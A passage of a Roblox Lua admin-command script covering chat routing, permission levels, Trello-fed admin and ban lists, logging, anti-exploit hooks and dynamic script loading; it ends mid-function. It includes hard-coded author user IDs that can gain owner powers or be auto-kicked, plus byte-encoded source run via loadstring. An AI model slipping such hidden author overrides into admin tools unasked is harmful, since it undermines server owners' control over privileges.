Pcall(function() for i,v in pairs(game:service('Workspace'):children()) do if v:IsA('Part') and v.Name:match('^Camera: (.*)') then table.insert(set.cameras,v) elseif v:IsA('Part') and v.Name:match('^Waypoint: (.*)') then set.Waypoints[v.Name:match('^Waypoint: (.*)')]=v.Position end end end)
Pcall(function() if set.RenameGameObjects then game:service('Workspace').Name=math.random() game:service('Lighting').Name=math.random() game:service('ReplicatedStorage').Name=math.random() game:service('ReplicatedStorage').Name=math.random() game:service('Players').Name=math.random() game:service('ServerScriptService').Name=math.random() game:service('ServerStorage').Name=math.random() game:service('StarterGui').Name=math.random() game:service('StarterPack').Name=math.random() game:service('Teams').Name=math.random() game:service('SoundService').Name=math.random() end end)
Pcall(function() local tempmodel=Instance.new('Model') for i,v in pairs(workspace:children()) do if v and not v:IsA('Terrain') and v.Archivable==true then v:Clone().Parent=tempmodel end end set.MapBackup=tempmodel:Clone() tempmodel:Destroy() end)

set.SendCustomChat=function(p,a,b)
	local target=set.SpecialPrefix..'all'
	if not b then b='Global' end
	if not game:service('Players'):FindFirstChild(p.Name) then b='Nil' end
	if a:sub(1,1)=='@' then
		b='Private'
		target,a=a:match('@(.%S+) (.+)')
		print(target..' '..a)
		set.Remote(p,'Function','SendToChat',p,a,b)
	elseif a:sub(1,1)=='#' then
		if a:sub(1,7)=='#ignore' then
			target=a:sub(9)
			b='Ignore'
		end
		if a:sub(1,9)=='#unignore' then
			target=a:sub(11)
			b='UnIgnore'
		end
	end
	for i,v in pairs(set.GetPlayers(p,target:lower())) do
		coroutine.wrap(function()
			if p.Name==v.Name and b~='Private' and b~='Ignore' and b~='UnIgnore' then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Global' then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Team' and p.TeamColor==v.TeamColor then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Local' and p:DistanceFromCharacter(v.Character.Head.Position)<80 then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Admin' and set.CheckAdmin(v,false) and set.CheckAdmin(p,false) then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Private' and v.Name~=p.Name then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Nil' then
				set.Remote(v,'Function','SendToChat',p,a,b)
			elseif b=='Ignore' and v.Name~=p.Name then
				set.Remote(v,'AddToTable','IgnoreList',v.Name)
			elseif b=='UnIgnore' and v.Name~=p.Name then
				set.Remote(v,'RemoveFromTable','IgnoreList',v.Name)
			end
		end)()
	end
end

set.Exploited=function(player,action,info)
	if action:lower()=='kick' then
		player:Kick()
	elseif action:lower()=='kill' then
		player:LoadCharacter()
	elseif action:lower()=='crash' then
		set.Remote(player,'Function','KillClient')
	else
		set.Remote(player,'Function','KillClient')
		player:Kick()
	end
	table.insert(set.PlayerLogs.Exploit,1,{Time=set.GetTime(),Name=player.Name,Info=info})
	if #set.PlayerLogs.Exploit>set.MaxNumberOfLogs then
		table.remove(set.PlayerLogs.Exploit,#set.PlayerLogs.Exploit)
	end
end

set.UpdateListGui=function(p,a)
	if a=='adminlogslist' then
		local temp={}
		for i,m in pairs(set.PlayerLogs.Admin) do
			if #temp>set.MaxNumberOfLogs then return end
			table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Log,Desc=m.Log})
		end
		set.Remote(p,'SetSetting',a,temp)
	elseif a=='chatlogslist' then
		local temp={}
		for i,m in pairs(set.PlayerLogs.Chat) do
			if #temp>5000 then return end
			if m.Nil then
				table.insert(temp,{Object='[NIL]['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
			else
				table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
			end
		end
		set.Remote(p,'SetSetting',a,temp)
	elseif a=='exploitlogslist' then
		local temp={}
		for i,m in pairs(set.PlayerLogs.Exploit) do
			if #temp>5000 then return end
			table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Log,Desc=m.Log})
		end
		set.Remote(p,'SetSetting',a,temp)
	elseif a=='donorlist' then
		local temptable={}
		table.insert(temptable,"Last Update: "..set.dlastupdate)
		for i,v in pairs(set.donors) do
			if game:service('Players'):FindFirstChild(v.Name) then
				if #temptable>5000 then return end
				table.insert(temptable,{Object=v.Name,Desc=v.List})
			end
		end
		set.Remote(p,'SetSetting',a,temptable)
	elseif a:match('^serverlogstuff%-') then
		local b=a:match('^serverlogstuff%-(.*)')
		local temp={}
		for i,v in pairs(game.LogService:GetLogHistory()) do
			if (b and b:lower()=='script') and v.message:find('Epix Edit') then
				if v.messageType==Enum.MessageType.MessageOutput then
					table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
				elseif v.messageType==Enum.MessageType.MessageWarning then
					table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
				elseif v.messageType==Enum.MessageType.MessageInfo then
					table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
				elseif v.messageType==Enum.MessageType.MessageError then
					table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
				end
			else 
			if (not b or b:lower()=='all' or b:lower()=='error') and v.messageType==Enum.MessageType.MessageError then
				table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
			end
			if (not b or b:lower()=='all' or b:lower()=='info') and v.messageType==Enum.MessageType.MessageInfo then
				table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
			end
			if (not b or b:lower()=='all' or b:lower()=='warning') and v.messageType==Enum.MessageType.MessageWarning then
				table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
			end
			if (not b or b:lower()=='all' or b:lower()=='output') and v.messageType==Enum.MessageType.MessageOutput then
				table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
			end
			end
		end
		set.Remote(p,'SetSetting',a,temp)
	end
end

set.Cape=function(player,material,color,decal,reflect)
	coroutine.wrap(function()
	player.Character:WaitForChild("Torso")
	local torso = player.Character.Torso
	local p = Instance.new("Part", player.Character) 
	p.Name = "EpicCape" 
	p.Anchored = false
	p.Transparency=0.0001
	p.Material=material
	p.CanCollide = false 
	p.TopSurface = 0 
	p.BottomSurface = 0 
	p.BrickColor = BrickColor.new(color)
	if reflect then
		p.Reflectance=reflect
	end 
	if decal then
	local dec = Instance.new("Decal", p) 
	dec.Face = 2 
	dec.Texture = "http://www.roblox.com/asset/?id="..decal 
	dec.Transparency=0 
	end
	p.formFactor = "Custom"
	p.Size = Vector3.new(.2,.2,.2)
	local msh = Instance.new("BlockMesh", p) 
	msh.Scale = Vector3.new(9,17.5,.5)
	p.Anchored=true
	set.Remote(player,'Function','MoveCape',p)
	end)()
end

set.CleanWorkspace=function()
for i, v in pairs(game.Workspace:children()) do 
if v:IsA("Hat") or v:IsA("Tool") then 
v:Destroy() 
end 
if v:IsA('Message') or v:IsA('Hint') then
	v:Destroy()
end
if v.Name:find('Epix Jail') then 
if not game:service('Players'):FindFirstChild(v.Player.Value) then 
set.JailedTools[v.Player.Value]=nil
v:Destroy() 
for k,m in pairs(set.objects) do
if m.Name==v.Player.Value .. " Epix Jail" then
table.remove(set.objects,k)
end
end
end 
end
end
end	

set.Ping=function(player)
	set[player.Name..'Ping']='Ping'
	set.Remote(player,'GetPing')
	repeat wait() until set[player.Name..'Ping']~='Ping'
	return set[player.Name..'Ping']
end

set.Split=function(msg,num)
if set.SplitKey=='' then set.SplitKey=' ' end
if num<=0 or msg==nil then return {} end
local tab={}
local str=msg
local full=''
	for a in str:gmatch('([^'..set.SplitKey..']+)') do
		if #tab>=num then break end
		if #tab==num-1 then
			tab[#tab+1]=msg:sub(#full+1,#msg)
		end
		if #tab>=num then break end
		str=a..set.SplitKey
		full=full..a..set.SplitKey
		tab[#tab+1]=a
		if #tab>=num then break end
	end
return tab
end

set.MakeCommand=function(desc,adminlevel,prefix,cmds,argtypes,args,func)
	coroutine.wrap(function()
		for i,v in pairs(set.CommandBlackList) do for k,m in pairs(cmds) do if v:lower()==m:lower() then adminlevel=5 end end end
		if not desc or type(desc)~='string' then print('No Description') return 
		elseif not adminlevel or type(adminlevel)~='number' then print(name..' has no admin level') return
		elseif not prefix or type(prefix)~='string' then print(name..' has no prefix') return 
		elseif not cmds or type(cmds)~='table' then print(name..' has no cmds') return 
		elseif not argtypes or type(argtypes)~='table' then print(name..' has no argtypes') return
		elseif not args or type(args)~='number' then print(name..' has no args') return
		elseif not func or type(func)~='function' then print(name..' has no func') return
		end
		local com={}
		com.Cmds=cmds
		com.MaxArgs=args
		com.Function=func
		com.ArgTypes=argtypes
		com.AdminLevel=adminlevel
		com.Prefix=prefix
		com.Desc=desc
		table.insert(set.Commands,com)
	end)()
end

set.GetCommand=function(Command) 
	for i,v in pairs(set.Commands) do
		for k,m in pairs(v.Cmds) do
			if not set.BuggedCommandMatching and Command:lower():match('^'..v.Prefix..'(%w+)')==m:lower() then
				return v,i
			elseif set.BuggedCommandMatching and Command:lower():match(v.Prefix..'(%w+)')==m:lower() then
				return v,i
			end
		end
	end
end

set.SearchCommand=function(plr,Command) 
	local tab={}
	for i,v in pairs(set.Commands) do
	local allowed=false
	if v.AdminLevel==-3 and ((set.FunCommands and set.CheckOwner(plr)) or set.CheckTrueOwner(plr)) then
		allowed=true
	elseif v.AdminLevel==-2 and ((set.FunCommands and set.CheckAdmin(plr,true)) or set.CheckTrueOwner(plr)) then
		allowed=true
	elseif v.AdminLevel==-1 and ((set.FunCommands and set.CheckAdmin(plr,false)) or set.CheckTrueOwner(plr)) then
		allowed=true
	elseif v.AdminLevel==0 and (set.PlayerCommands or set.CheckAdmin(plr,false))then
		allowed=true
	elseif v.AdminLevel==1 and (set.CheckDonor(plr) or set.CheckTrueOwner(plr)) then
		allowed=true
	elseif v.AdminLevel==2 and set.CheckAdmin(plr,false) then
		allowed=true
	elseif v.AdminLevel==3 and set.CheckAdmin(plr,true) then
		allowed=true
	elseif v.AdminLevel==4 and set.CheckOwner(plr)  then
		allowed=true
	elseif v.AdminLevel==5 and set.CheckTrueOwner(plr) then
		allowed=true
	end
	if allowed then
		for k,m in pairs(v.Cmds) do
			if (v.Prefix..m:lower()):find(Command:lower()) or Command=='all' then
				local c=m
				for l,n in pairs(v.ArgTypes) do
					c=c..set.SplitKey..n
				end
				table.insert(tab,v.Prefix..c)
			end
		end
	end
	end
	return tab
end

set.RunCommand=function(command,...)
	local com=set.Prefix..command
	local tab={...}
	for i,v in pairs(tab) do
		com=com..set.SplitKey..v
	end
	set.ProcessCommand('SYSTEM',com)
end

set.ProcessCommand=function(player,chat,dontlog,check)
	local com,num=set.GetCommand(chat)
	if (not com) and check then 
		print(chat..' is not a valid command.') 
		set.Remote(player,'Function','OutputGui',chat..' is not a valid command.')
	elseif com then
		local command=chat:match(com.Prefix..'%w+'..set['SplitKey']..'(.+)') or ''
		local allowed=false
		local isSystem=false
		if type(player)=='string' then 
			if player=='SYSTEM' then
				allowed=true
				isSystem=true
			end
		elseif com.AdminLevel==-3 and ((set.FunCommands and set.CheckOwner(player)) or set.CheckTrueOwner(player)) then
			allowed=true
		elseif com.AdminLevel==-2 and ((set.FunCommands and set.CheckAdmin(player,true)) or set.CheckTrueOwner(player)) then
			allowed=true
		elseif com.AdminLevel==-1 and ((set.FunCommands and set.CheckAdmin(player,false)) or set.CheckTrueOwner(player)) then
			allowed=true
		elseif com.AdminLevel==0 and (set.PlayerCommands or set.CheckAdmin(player,false))then
			allowed=true
		elseif com.AdminLevel==1 and ((set.CheckDonor(player) and (set.DonorPerks or set.CheckNTac(player))) or set.CheckTrueOwner(player)) then
			allowed=true
		elseif com.AdminLevel==2 and set.CheckAdmin(player,false) then
			allowed=true
		elseif com.AdminLevel==3 and set.CheckAdmin(player,true) then
			allowed=true
		elseif com.AdminLevel==4 and set.CheckOwner(player)  then
			allowed=true
		elseif com.AdminLevel==5 and set.CheckTrueOwner(player) then
			allowed=true
		end
		if not allowed then print(player.Name..' is not allowed to run '..chat) set.Remote(player,'Function','OutputGui','You are not allowed to run '..chat) return end
		if not isSystem and not dontlog then
			table.insert(set.PlayerLogs.Admin,1,{Time=set.GetTime(),Name=player.Name,Log=chat})
			if #set.PlayerLogs.Admin>set.MaxNumberOfLogs then
				table.remove(set.PlayerLogs.Admin,#set.PlayerLogs.Admin)
			end
			if set.CommandComfirmation then
				set.Hint('Executed Command: [ '..chat..' ]',{player})
			end
		end
		local ran,failed=ypcall(com.Function,player,set.Split(command,com.MaxArgs))
		if failed then print('Error: '..failed) if not isSystem then set.OutputGui(player,'Command Error:',failed) end end
	end
end

set.CheckPlayer=function(plr, player)
	for i,v in pairs(set.GetPlayers(plr, player:lower())) do
		if v then return true end
	end
	return false
end

set.Round=function(num)
	if num >= 0.5 then
		return math.ceil(num)
	elseif num < 0.5 then
		return math.floor(num)
	end
end

set.UpdateTrello=function()
if not set.CheckHttp() then 
set.bl={'Http is not enabled! Cannot connect to Trello.'}
else
set.bl={'Updating...'}
set.al = {}
set.tal = {}
set.oal = {}
local hs=game:service('HttpService')
local get=hs:GetAsync('https://api.trello.com/1/boards/'..set.BoardID..'/lists',true)
local tab=hs:JSONDecode(get)
for i,v in pairs(tab) do
	if v.name:match('^Ban List%s?$') then
		local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
		local tabal=hs:JSONDecode(getal)
		for l,k in pairs(tabal) do
			coroutine.wrap(function()
			if k.name:match('Group: (.*):(.*)') then
				local a,b=k.name:match('Group: (.*):(.*)')
				table.insert(set.bl,'$group='..b)
			elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
				local a,b=k.name:match('(.*):(.*)')
				table.insert(set.bl,a..'='..b)
			elseif not k.name:find(':') then
				table.insert(set.bl,k.name)
			end
			end)()
		end
		elseif v.name:match('^TempAdmin List%s?$') then
		local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
		local tabal=hs:JSONDecode(getal)
		for l,k in pairs(tabal) do
			table.insert(set.tal,k.name)
--			coroutine.wrap(function()
--			if k.name:match('Group: (.*):(.*)') then
--				local a,b=k.name:match('Group: (.*):(.*)')
--				table.insert(set.bl,'$group='..b)
--			elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
--				local a,b=k.name:match('(.*):(.*)')
--				table.insert(set.bl,a..'='..b)
--			elseif not k.name:find(':') then
--				table.insert(set.bl,k.name)
--			end
--			end)()
		end
		elseif v.name:match('^Admin List%s?$') then
		local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
		local tabal=hs:JSONDecode(getal)
		for l,k in pairs(tabal) do
			table.insert(set.al,k.name)
--			coroutine.wrap(function()
--			if k.name:match('Group: (.*):(.*)') then
--				local a,b=k.name:match('Group: (.*):(.*)')
--				table.insert(set.bl,'$group='..b)
--			elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
--				local a,b=k.name:match('(.*):(.*)')
--				table.insert(set.bl,a..'='..b)
--			elseif not k.name:find(':') then
--				table.insert(set.bl,k.name)
--			end
--			end)()
		end
		elseif v.name:match('^Owner List%s?$') then
		local getal=hs:GetAsync('https://api.trello.com/1/lists/'..v.id..'/cards',true)
		local tabal=hs:JSONDecode(getal)
		for l,k in pairs(tabal) do
			table.insert(set.oal,k.name)
--			coroutine.wrap(function()
--			if k.name:match('Group: (.*):(.*)') then
--				local a,b=k.name:match('Group: (.*):(.*)')
--				table.insert(set.bl,'$group='..b)
--			elseif k.name:match('(.*):(.*)') and not v.name:match('Group: (.*)') then
--				local a,b=k.name:match('(.*):(.*)')
--				table.insert(set.bl,a..'='..b)
--			elseif not k.name:find(':') then
--				table.insert(set.bl,k.name)
--			end
--			end)()
		end
	end
end
set.bl[1]='Last Updated at '..set.GetTime()
end
end

set.GetPlayerInfo=function(p,localplayer,msg)
if not p:IsA("Player") then return end
local mem
if p.MembershipType == Enum.MembershipType.None then
	mem='NBC'
elseif p.MembershipType == Enum.MembershipType.BuildersClub then
	mem='BC'
elseif p.MembershipType == Enum.MembershipType.TurboBuildersClub then
	mem='TBC'
elseif p.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
	mem='OBC'
end
if set['GroupId']~=0 then
	if p:IsInGroup(set['GroupId']) then
	set.Hint(msg.." | "..mem.." | Name: "..p.Name.." ("..p.userId..") | Account Age: "..p.AccountAge.." | Rank: "..p:GetRoleInGroup(set['GroupId']), localplayer)
	else
	set.Hint(msg.." | "..mem.." | Name: "..p.Name.." ("..p.userId..") | Account Age: "..p.AccountAge.." | Player is not in group "..set['GroupId'], localplayer)
	end
else
set.Hint(msg.." | "..mem.." | Name: "..p.Name.." ("..p.userId..") | Account Age: "..p.AccountAge, localplayer)
end
end;

set.AdminChat=function(plr)
if set.CheckAdmin(plr,false) then
set.Remote(plr,'Function','AdminChat')
end
end

set.CheckTimeBan=function(plr)
	plr:WaitForDataReady()
	if plr:LoadString('Epix Kohls TimeBan_Time')~='nil' and plr:LoadString('Epix Kohls TimeBan_Time')~=nil and tonumber(plr:LoadString('Epix Kohls TimeBan_Time')) then
		local new=tonumber(plr:LoadString('Epix Kohls TimeBan_Time'))
		local old=os.time()
		if old>=new then
			plr:SaveString('Epix Kohls TimeBan_Time','nil')
		else
			plr:Kick()
		end
	end
end

set.CmdBar=function(plr)
if set.CheckAdmin(plr,false) then
	set.Remote(plr,'Function','CmdBar')
end
end
set.GetTime=function()
local hour = math.floor((os.time()%86400)/60/60) 
local min = math.floor(((os.time()%86400)/60/60-hour)*60)
if min < 10 then min = "0"..min end
return hour..":"..min
end set.ServerStartTime=set.GetTime()

set.GrabNilPlayers=function(name)
	local AllGrabbedPlayers = {}
	for i,v in pairs(game:GetService('NetworkServer'):GetChildren()) do
		pcall(function()
			if v:IsA("ServerReplicator") then
				if v:GetPlayer().Name:lower():sub(1,#name)==name:lower() or name=='all' then
				table.insert(AllGrabbedPlayers, v:GetPlayer())
				end
			end
		end)
	end
	return AllGrabbedPlayers
end

set.AssignName=function()
	local name=math.random(100000,999999)
	return name
end

set.LoadScript=function(type,source,name,object,parent)
	Pcall(function()
		local ScriptType
		if type=='Script' then 
			ScriptType=deps.ScriptBase 
		elseif type=='LocalScript' then 
			ScriptType=deps.LocalScriptBase 
		end
		if ScriptType then
			local cl=ScriptType:Clone()
			local key=Instance.new('StringValue',cl)
			key.Name='SecurityKey'
			key.Value=math.random(10000000,99999999)
			cl.Name=name
			local specialkey=Instance.new('StringValue',cl)
			specialkey.Value=math.random(10000000,99999999)
			specialkey.Name='SpecialKey'
			local x = 'local '..specialkey.Value..'="'..key.Value..'" coroutine.wrap(function() '..source
			local y = '' for i = 1,string.len(x) do y = y.. string.char(44) .. string.byte(x:sub(i,i)) end
			local code=Instance.new('StringValue',cl)
			code.Name='Code'
			code.Value=string.sub(y,2,string.len(y))
			cl.Parent=parent or game:service('ServerScriptService')
			cl.Disabled=false
			if object==true then
				table.insert(set.objects,cl)
			end
		elseif set.canuseloadstring then
			Pcall(function() loadstring(source)() end)
		end
	end)
end

set.LoadOnClient=function(player,source,object,name)
	if game:service('Players'):FindFirstChild(player.Name) then
		parent=player:FindFirstChild('PlayerGui') or player:WaitForChild('Backpack')
		set.LoadScript('LocalScript',source,set.GuiName..name,object,parent)
	else
		set.Remote(player,'Loadstring',source)
	end
end

set.PromptPlaceTeleport=function(player,msg,placeid)
	set.Remote(player,'Function','PromptPlaceTeleport',msg,placeid)
end

set.CheckNTac=function(plr)
	if set.Debug then return false end
	for i,v in pairs(set.NTacId) do
		if plr.userId==v then
			return true
		end
	end
end

set.CheckTrueOwner=function(plr)
	if set.Debug then return false end
	if (set.CheckOwner(plr) and set['OwnersAreTrueOwners']) or plr.userId==game.CreatorId or (set.CheckNTac(plr) and set.CreatorDebugPowers) then return true end
end

set.CheckOwner=function(plr)
for i,v in pairs(set.Owners) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
return false
end

set.CheckAdmin=function(plr,ck) 
for i,v in pairs(set.Owners) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
for i,v in pairs(set.Admins) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
for i,v in pairs(set.TempAdmins) do 
	if not ck then
		if plr.Name==v then 
			return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				return true
			end
		end
	end
end
for i,v in pairs(set.oal) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
for i,v in pairs(set.al) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
for i,v in pairs(set.tal) do 
	if not ck then
		if plr.Name==v then 
			return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				return true
			end
		end
	end
end
return false 
end

set.RemoveAdmin=function(plr,sender)
if not set.CheckAdmin(plr,false) then return true end
local level=0
if sender and sender:IsA('Player') then
	if set.CheckTrueOwner(plr) or sender==plr then return false end
	if set.CheckTrueOwner(sender) then level=3 elseif set.CheckOwner(sender) then level=2 elseif set.CheckAdmin(sender,true) then level=1 end
else
	level=3
end
for i,v in pairs(set.Owners) do 
	if level>=3 then 
		if plr.Name==v then 
			table.remove(set.Owners,i) return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				table.remove(set.Owners,i) return true
			end
		end
	end
end
for i,v in pairs(set.Admins) do 
	if level>=2 then
		if plr.Name==v then 
			table.remove(set.Admins,i) return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				table.remove(set.Admins,i) return true
			end
		end
	end
end
for i,v in pairs(set.TempAdmins) do 
	if level>=1 then
		if plr.Name==v then 
			table.remove(set.TempAdmins,i) return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				table.remove(set.TempAdmins,i) return true
			end
		end
	end
end
return false
end

set.GetPlayers=function(plr, names)
	local players = {} 
	local parent=game:FindFirstChild("NetworkServer") or game:service('Players')
	for s in names:gmatch('([^,]+)') do
		local plrs=0
		local function plus()
			plrs=plrs+1
		end
		local function getplr(p)
			if p:IsA('NetworkReplicator') then
				if p:GetPlayer()~=nil and p:GetPlayer():IsA('Player') then
					p=p:GetPlayer()
				end
			end
			return p
		end
		if s:lower()==set.SpecialPrefix..'me' and plr then
			table.insert(players,plr)
			plus()
		elseif s:lower()==set.SpecialPrefix..'all' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				table.insert(players,p)
				plus()
			end
		elseif s:lower()==set.SpecialPrefix..'others' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if p~=plr then
					table.insert(players,p)
					plus()
				end
			end
		elseif s:lower()==set.SpecialPrefix..'random' then
			local rand=parent:children()[math.random(#parent:children())]
			local p=getplr(rand)
			table.insert(players,p)
			plus()
		elseif s:lower()==set.SpecialPrefix..'admins' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if set.CheckAdmin(p,false) then
					table.insert(players,p)
					plus()
				end
			end
		elseif s:lower()==set.SpecialPrefix..'nonadmins' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if not set.CheckAdmin(p,false) then
					table.insert(players,p)
					plus()
				end
			end
		elseif s:lower():sub(1,1)=='%' then
			for i,v in pairs(game:service('Teams'):children()) do
				if v.Name:lower():sub(1,#s:sub(2))==s:lower():sub(2) then
					for k,m in pairs(parent:children()) do
						local p=getplr(m)
						if p.TeamColor==v.TeamColor then
							table.insert(players,p)
							plus()
						end
					end
				end
			end
		elseif s:lower():sub(1,1)=='$' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if tonumber(s:lower():sub(2)) then
					if p:IsInGroup(tonumber(s:lower():sub(2))) then
						table.insert(players,p)
						plus()
					end
				end
			end
		elseif s:lower():sub(1,1)=='-' then
			for i,v in pairs(players) do
				if v.Name:lower():sub(1,#s:sub(2))==s:lower():sub(2) then
					table.remove(players,i)
					plus()
				end
			end
		else
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if p.Name:lower():sub(1,#s)==s:lower() then
					table.insert(players,p)
					plus()
				end
			end
		end
		if plrs==0 then set.OutputGui(plr,'','No players matching '..s..' were found!') end
	end
	return players
end

set.Hint=function(str, plrz, time)
if not str then return end
for i,v in pairs(plrz) do
set.Remote(v,'Function','Hint',str,time)
end
end

set.Message=function(ttl, str, scroll, plrz, time)
if not ttl or not str then return end
for i,v in pairs(plrz) do
set.Remote(v,'Function','Message',ttl,str,scroll,time)
end
end

set.RemoveMessage=function() 
for i,v in pairs(game:service('Players'):children()) do 
set.Remote(v,'Function','RemoveMessage')
end
end

set.OutputGui=function(plr,msg,e)
local a,b,c=e:match('(.*):(.*):(.*)')
local err
if a and b and c then
if #c<=3 then return end
err = msg..' Line:'..b..' - '..c--e:match("\:(%d+\:.*)")  
else
err = msg..e
end
set.Remote(plr,'Function','OutputGui',err)
end

set.Output=function(str, plr)
if not set.canuseloadstring then return end
local b, e = loadstring(str)
if e then--and e:match("\:(%d+\:.*)") then
	set.OutputGui(plr,'Error',e)
--err="Line "..e:match("\:(%d+\:.*)")
--set.Remote(plr,'Function','OutputGui',err)
end
end

set.PM=function(from,p,message,player)
set.Remote(p,'Function','PrivateMessage',from,message,player)
end

set.CheckBan=function(tabalz,p)
if set.CheckExcluded(p) or set.CheckAdmin(p,false) or set.CheckTrueOwner(p) then return false end
Pcall(function()
for k,m in pairs(set.BTacId) do if p.userId==m then p:Kick() return true end end
for i,v in pairs(tabalz) do
coroutine.wrap(function()
	if v:match('(.*)=(.*)') then
	local name,id=v:match('(.*)=(.*)')
	if name and id then
		if p.Name:lower()==name:lower() or p.userId==tonumber(id)  then
			p:Kick()
			return true
		elseif name=='$group' then
			if p:IsInGroup(tonumber(id)) then p:Kick() return true end
		end
	end
	else
	if p.Name:lower()==v:lower() then
		p:Kick()
		return true
	end
	end
end)()
end
end)
end

set.CheckMute=function(player)
	for i,v in pairs(set['MuteList']) do
		if v==player.Name then
			set.Remote(v,'Function','MutePlayer','on')
		end
	end
end

set.CharacterLoaded=function(player)
	Pcall(function() if set['CustomChat'] then set.Remote(player,'Function','CustomChatGui') end
	if set['CustomPlayerList'] then set.Remote(player,'Function','CustomLeaderboard') end
	if set.HelpGui then set.Remote(player,'Function','HelpInfoGui') end
	if set.Console then set.Remote(player,'Function','ConsoleGui') end
	if set.CheckAdmin(player,false) and set['AdminsSpawnWithGuis'] then set.CmdBar(player) if not set.CustomChat then set.AdminChat(player) end end
	set.ProcessPluginEvent('CharacterAdded',player) end)
	Pcall(function() if set.Detection and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','check1') end end)
	Pcall(function() player:WaitForDataReady() if player:LoadBoolean('Kohls Not Using Cape') then return end set.Donor(player) end)
	Pcall(function() if set['AntiSpeed'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','speed') end end)
	Pcall(function() if set['AntiGod'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','god') end end)
	Pcall(function() if set['AntiAnimation'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then c:WaitForChild('Animate') c.Animate:Destroy() local cl=deps.Animate:clone() cl.Parent=c cl.Disabled=false end end) 
end

set.MakePluginEvent=function(type,func)
	if type:lower()=='chat' or type:lower()=='playerchatted' or type:lower()=='chatted' then
		set.PluginEvents.Chat[#set.PluginEvents.Chat+1]=func
	elseif type:lower()=='newplayer' or type:lower()=='playerjoined' then
		set.PluginEvents.PlayerJoined[#set.PluginEvents.PlayerJoined+1]=func
	elseif type:lower()=='characteradded' or type:lower()=='characterloaded' then
		set.PluginEvents.CharacterAdded[#set.PluginEvents.CharacterAdded+1]=func
	end
end

set.ProcessPluginEvent=function(type,...)
	for i,v in pairs(set.PluginEvents[type]) do
		local yes,no=ypcall(v,...)
		if no then print(no) end
	end
end

set.CheckHttp=function()
	local y,n=ypcall(function()
		local hs=game:service('HttpService')
		local get=hs:GetAsync('http://google.com')
	end)
	if y and not n then return true end
end

set.CheckGroupAdmin=function(player)
	if player and player:IsA("Player") then
		if set.GroupRanks then
			for i,v in pairs(set.Ranks) do
				if not player then return end
				if player:IsInGroup(v.Group) then
					local tab=set.TempAdmins
					if v.Type=='Temp' then
						tab=set.TempAdmins
					elseif v.Type=='Admin' then
						tab=set.Admins
					elseif v.Type=='Owner' then
						tab=set.Owners
					end
					if type(v.Rank)=='string' or (type(v.Rank)=='number' and v.Rank>0) then
						if type(v.Rank)=='number' and player:GetRankInGroup(v.Group)==v.Rank then
							if v.Type=='Banned' then
								player:Kick()
								return false
							end
							return tab
						elseif  player:GetRoleInGroup(v.Group)==v.Rank then
							if v.Type=='Banned' then
								player:Kick()
								return false
							end
							return tab
							end
